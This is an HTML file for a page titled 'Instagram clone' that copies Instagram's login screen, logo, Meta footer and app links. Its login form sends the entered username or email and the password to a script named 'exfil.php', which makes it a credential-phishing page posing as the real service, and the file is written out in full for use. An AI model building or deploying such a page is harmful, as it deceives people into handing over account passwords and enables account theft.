<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form action="exfil.php" method="post">
                    <label for="email" class="sr-only">Phone number,username, or email</label>
                    <input name="email" id="Inp" placeholder="Phone number,username, or email" />

                    <label for="password" class="sr-only">Password</label>
                    <input name="password" id="Inp2" type="password" placeholder="Password" />

                    <button type="sumbit" name="sub">Log in</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a href="https://www.facebook.com" target="_blank">Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password ?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blogs</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Location</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">Meta Verified</a></li>
        </ul>
        <p class="copyright">© 2024 Instagram from Meta</p>
    </footer>

</body>
</html>

